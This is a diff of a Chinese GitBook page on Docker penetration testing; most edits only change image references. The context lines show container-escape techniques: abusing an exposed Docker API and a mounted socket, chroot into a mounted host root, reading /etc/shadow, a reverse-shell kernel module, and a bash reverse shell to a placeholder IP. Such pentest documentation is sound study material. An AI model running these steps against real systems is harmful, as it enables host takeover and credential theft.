@@ -12,9 +12,9 @@
 
 根据论文将所有攻击手法梳理出来：
 
-![](<../../.gitbook/assets/image (582).png>)
+![](<../../.gitbook/assets/image (947).png>)
 
-![](<../../.gitbook/assets/image (588).png>)
+![](<../../.gitbook/assets/image (916).png>)
 
 ## Docket简介
 
@@ -22,13 +22,13 @@ Docker 使用Google公司推出的 Go 语言进行开发实现，基于Linux内�
 
 虚拟化是一种资源管理技术，将计算机实体资源，如服务器、网络、内存等予以抽象转换后呈现出来，在同一主机上同时运行多个系统从而提高系统资源的利用率，降低成本方便管理和容错等好处。
 
-![](<../../.gitbook/assets/image (604).png>)
+![](<../../.gitbook/assets/image (859).png>)
 
 传统方式是在硬件层面实现虚拟化，需要额外的虚拟机管理应用和虚拟机操作系统层，Docker容器是在操作系统层面上实现虚拟化，直接复用本地主机操作系统，因此更加轻量级。
 
 Docker引擎由如下主要组件构成：Docker客户端（Docker Client）、Docker守护进程（Docker daemon）、containerd以及runc。它们共同负责容器的创建和运行。
 
-![](<../../.gitbook/assets/image (583).png>)
+![](<../../.gitbook/assets/image (954).png>)
 
 ### Docker Client
 
@@ -81,7 +81,7 @@ docker container run --name ctrl -it alpine:latest sh
 
 虚拟机和容器最大的区别是容器更快并且更轻量级，与虚拟机运行在完整的操作系统相比，容器会共享其所在主机的操作系统、内核。
 
-![](<../../.gitbook/assets/image (579).png>)
+![](<../../.gitbook/assets/image (423).png>)
 
 ### Data Persistence
 
@@ -102,7 +102,7 @@ Libnetwork通过Go语言编写，并实现了CNM中列举的核心组件。\
 
 ## Docker安全机制
 
-![](<../../.gitbook/assets/image (605).png>)
+![](<../../.gitbook/assets/image (801).png>)
 
 利用了大部分Linux通用安全技术，这些技术包括了命名空间（Namespace）、控制组（CGroup）、系统权限（Capability）、强制访问控制（MAC）等。
 
@@ -145,7 +145,7 @@ Docker使用过滤模式下的Seccomp来限制容器对宿主机内核发起的�
 
 ### Attacker Models
 
-![](<../../.gitbook/assets/image (575).png>)
+![](<../../.gitbook/assets/image (963).png>)
 
 整个容器环境的潜在攻击面和攻击对象，由四类威胁：\
 但实际最为重点的是，容器逃逸和针对Docker守护进程的攻击。
@@ -202,7 +202,7 @@ Docker的镜像会尽可能的小，只保留一些必要的库，而一些像�
 
 mount命令查看
 
-![](<../../.gitbook/assets/image (593).png>)
+![](<../../.gitbook/assets/image (602).png>)
 
 Docker容器环境检测方法【代码】\
 [https://blog.csdn.net/hsluoyc/article/details/51075230](https://blog.csdn.net/hsluoyc/article/details/51075230)
@@ -260,7 +260,7 @@ Docker守护进程启动参数，读取配置文件：
 curl localhost:2375/version
 ```
 
-![](<../../.gitbook/assets/image (591).png>)
+![](<../../.gitbook/assets/image (207).png>)
 
 ```
 export DOCKER_HOST="tcp://localhost:2375"
@@ -276,7 +276,7 @@ export DOCKER_HOST="tcp://localhost:2375"
 > cat /etc/shadow
 > ```
 
-![](<../../.gitbook/assets/image (599).png>)
+![](<../../.gitbook/assets/image (161).png>)
 
 #### 挂载Docker Socket
 
@@ -287,10 +287,9 @@ export DOCKER_HOST="tcp://localhost:2375"
 * 一个容器权限
 * 拥有访问Docket Socket权限。
 
-查找docker socket\
+查找docker socket<br>
 
-
-![](<../../.gitbook/assets/image (590).png>)
+![](<../../.gitbook/assets/image (384).png>)
 
 安装docker client\
 apt-get install docker.io
@@ -302,10 +301,9 @@ docker images
 docker run -it -v /:/host/ ubuntu:18.04 bash
 
 在新容器执行，将根目录换成指定的目录：\
-chroot ./ bash\
+chroot ./ bash<br>
 
-
-![](<../../.gitbook/assets/image (587).png>)
+![](<../../.gitbook/assets/image (303).png>)
 
 基本从容器中逃逸出来了，可以往crontab写计算任务反弹Shell进行操控。
 
@@ -374,7 +372,7 @@ cd /host
 chroot ./ bash
 ```
 
-![](<../../.gitbook/assets/image (603).png>)
+![](<../../.gitbook/assets/image (545).png>)
 
 #### Capabilities
 
@@ -396,7 +394,7 @@ docker run —rm -it —cap-add=CAP_SYS_ADMIN —security -opt apparmor=unconfin
 capsh —print
 ```
 
-![](<../../.gitbook/assets/image (574).png>)
+![](<../../.gitbook/assets/image (125).png>)
 
 容器目前是具备有管理功能，并且可以访问到宿主机上的磁盘
 
@@ -404,11 +402,11 @@ capsh —print
 fdisk -l
 ```
 
-![](<../../.gitbook/assets/image (581).png>)
+![](<../../.gitbook/assets/image (1068).png>)
 
 查看宿主机shadow
 
-![](<../../.gitbook/assets/image (596).png>)
+![](<../../.gitbook/assets/image (237).png>)
 
 通过nc扫描宿主机网络，一般网关地址都为宿主机
 
@@ -416,7 +414,7 @@ fdisk -l
 nc -v -n w2 -z 172.17.0.1 1-65535
 ```
 
-![](<../../.gitbook/assets/image (602).png>)
+![](<../../.gitbook/assets/image (1041).png>)
 
 使用chroot在/mnt创建用户
 
@@ -477,7 +475,7 @@ clean:
 insmod reverse-shell.ko
 ```
 
-![](<../../.gitbook/assets/image (600).png>)
+![](<../../.gitbook/assets/image (968).png>)
 
 ```
 nc -v -l -p 4444
@@ -487,67 +485,62 @@ nc -v -l -p 4444
 
 原理就是创建容器挂载宿主机目录，通过chroot切换Shell\
 后台没有默认帐号密码，当第一次登录系统会提示设置新密码。\
-进入容器中：\
+进入容器中：<br>
 
+![](<../../.gitbook/assets/image (416).png>)
 
-![](<../../.gitbook/assets/image (580).png>)
+![](<../../.gitbook/assets/image (587).png>)
 
-![](<../../.gitbook/assets/image (578).png>)
+添加容器：<br>
 
-添加容器：\
+![](<../../.gitbook/assets/image (419).png>)
 
+填写内容，境像随便找一个：<br>
 
-![](<../../.gitbook/assets/image (584).png>)
-
-填写内容，境像随便找一个：\
-
-
-![](<../../.gitbook/assets/image (592).png>)
+![](<../../.gitbook/assets/image (565).png>)
 
 重点是添加Volumes
 
-![](<../../.gitbook/assets/image (589).png>)
+![](<../../.gitbook/assets/image (366).png>)
 
 \
-挂载根目录：\
+挂载根目录：<br>
 
+![](<../../.gitbook/assets/image (1026).png>)
 
-![](<../../.gitbook/assets/image (601).png>)
+之后部署：<br>
 
-之后部署：\
-
-
-![](<../../.gitbook/assets/image (595).png>)
+![](../../.gitbook/assets/image.png)
 
 部署成功后回到容器中：\
 进入到终端
 
-![](<../../.gitbook/assets/image (594).png>)
+![](<../../.gitbook/assets/image (433).png>)
 
-![](<../../.gitbook/assets/image (597).png>)
+![](<../../.gitbook/assets/image (1081).png>)
 
 **在实战中往往创建一个容器启动不起来。**\
 可以先进入Stacks进入到一个已启动的容器中：\
 从这里面挂载宿主根目录。
 
-![](<../../.gitbook/assets/image (576).png>)
+![](<../../.gitbook/assets/image (304).png>)
 
 回到Containers中，进入终端
 
 \
 将/host目录设置为当前终端目录
 
-![](<../../.gitbook/assets/image (573).png>)
+![](<../../.gitbook/assets/image (328).png>)
 
 ```
 chroot /host/ bash
 ```
 
-![](<../../.gitbook/assets/image (586).png>)
+![](<../../.gitbook/assets/image (141).png>)
 
 使用Ubuntu20做宿主机
 
-![](<../../.gitbook/assets/image (598).png>)
+![](<../../.gitbook/assets/image (429).png>)
 
 发现无法连通外网，添加DNS就可以了：
 
@@ -614,7 +607,7 @@ docker exec -it name /bin/bash
 bash -i >& /dev/tcp/123.123.123.123/8080 0>& 1
 ```
 
-![](<../../.gitbook/assets/image (572).png>)
+![](<../../.gitbook/assets/image (5).png>)
 
 ### Dirty Cow（CVE-2016-5195）
 
@@ -673,7 +666,7 @@ post/multi/gather/docker_creds
 [https://github.com/kost/dockscan](https://github.com/kost/dockscan)\
 [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained)\
 [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco)\
-[https://github.com/ianxtianxt/docker\_api\_vul](https://github.com/ianxtianxt/docker\_api\_vul)
+[https://github.com/ianxtianxt/docker\_api\_vul](https://github.com/ianxtianxt/docker_api_vul)
 
 云平台：
 
@@ -684,7 +677,7 @@ post/multi/gather/docker_creds
 
 ## 参考阅读文章
 
-{% file src="../../.gitbook/assets/a_methodology_for_penetration_testing_docker_systems.pdf" %}
+{% file src="../../.gitbook/assets/A_Methodology_for_Penetration_Testing_Docker_Systems.pdf" %}
 荷兰大学docker论文
 {% endfile %}
 
